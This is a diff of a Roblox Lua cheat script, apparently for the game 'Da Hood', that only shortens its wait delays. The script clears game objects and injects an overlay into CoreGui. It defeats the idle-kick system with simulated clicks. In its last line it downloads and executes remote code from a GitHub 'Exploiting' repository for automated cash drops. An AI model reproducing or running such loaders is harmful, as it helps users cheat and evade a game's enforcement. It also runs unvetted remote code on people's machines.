@@ -1,5 +1,5 @@
 game.Workspace.Ignored.Drop:Destroy()
-wait (0.5)
+wait (0.1)
 for _,v in pairs(workspace:GetDescendants()) do
 if v.ClassName == "Part"
 or v.ClassName == "SpawnLocation"
@@ -9,7 +9,7 @@ or v.ClassName == "MeshPart" then
 v.Material = "Plastic"
 end
 end
-wait (0.5)
+wait (0.1)
 wait(0.5)local ba=Instance.new("ScreenGui")
 local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
 local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
@@ -29,5 +29,5 @@ ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
 game:service'Players'.LocalPlayer.Idled:connect(function()
 bb:CaptureController()bb:ClickButton2(Vector2.new())
 ab.Text="haha no kick nob"wait(2)ab.Text="Working"end)
-wait (0.5)
+wait (0.1)
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()
